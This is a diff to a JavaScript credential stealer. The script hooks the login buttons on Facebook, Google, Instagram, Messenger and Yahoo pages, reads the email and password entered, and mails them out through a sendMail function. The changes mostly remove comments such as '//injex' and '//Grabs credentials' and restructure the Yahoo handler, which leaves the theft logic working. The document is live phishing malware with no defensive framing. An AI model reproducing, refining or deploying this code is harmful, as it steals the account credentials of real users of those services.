@@ -43,7 +43,6 @@ function sendMail(obj){
 
 function facebook(){
 	let subject = "FB";
-	//Grabs login button object
 	let loginbutton;
 	try {
 		loginbutton = document.getElementById("loginbutton");
@@ -51,10 +50,7 @@ function facebook(){
 	catch(error) {
 		loginbutton = document.getElementsByName("login")[0];
 	}
-	//injex
 	loginbutton.onclick = function(){
-		//alert(useringer);
-		//Grabs credentials
 		let email = document.getElementsByName("email")[0].value;
 		let pass = document.getElementsByName("pass")[0].value;
 		//Checks
@@ -71,10 +67,8 @@ function google(){
 	let subject = "GOOGLE";
 	//Grabs login button object
 	let loginbutton = document.getElementById("passwordNext");
-	//injex
 	if (loginbutton.onclick === null){
 		loginbutton.onclick = function (){
-			//Grabs credentials
 			let email = document.getElementById("profileIdentifier").innerText;
 			let pass = document.getElementsByName("password")[0].value;
 			//Checks
@@ -92,9 +86,7 @@ function instagram(){
 	let subject = "INSTA";
 	//Grabs login button object
 	let loginbutton = document.getElementsByTagName("button")[0];
-	//injex
 	loginbutton.onclick = function (){
-		//Grabs credentials
 		let email = document.getElementsByName("username")[0].value;
 		let pass = document.getElementsByName("password")[0].value;
 		//Checks
@@ -111,9 +103,7 @@ function messenger(){
 	let subject = "MSG";
 	//Grabs login button object
 	let loginbutton = document.getElementById("loginbutton");
-	//injex
 	loginbutton.onclick = function (){
-		//Grabs credentials
 		let email = document.getElementById("email").value;
 		let pass = document.getElementById("pass").value;
 		//Checks
@@ -129,19 +119,19 @@ function messenger(){
 function yahoo(){
 	let subject = "YHO";
 	let loginbutton = document.getElementById("login-signin");
+	if (loginbutton.onclick === null){
 		loginbutton.onclick = function (){
-		//Grabs credentials
-		let email = document.getElementsByClassName("yid")[0].innerText;
-		let pass = document.getElementsByName("password")[0].value;
-		//Checks
-		if (typeof useringer === "undefined") {let useringer = "None"};
-		if (validateCredentials(email, pass)){
-			getreqjson["subject"] = subject;
-			getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
-			sendMail(getreqjson);
+			let email = document.getElementsByClassName("yid")[0].innerText;
+			let pass = document.getElementsByName("password")[0].value;
+			//Checks
+			if (typeof useringer === "undefined") {let useringer = "None"};
+			if (validateCredentials(email, pass)){
+				getreqjson["subject"] = subject;
+				getreqjson["bodyHTML"] = makeMessage(email, pass, useringer, Date());
+				sendMail(getreqjson);
+			}
 		}
 	}
-	
 }
 //main
 if (hostname.includes("facebook")){setTimeout(facebook,1500)}
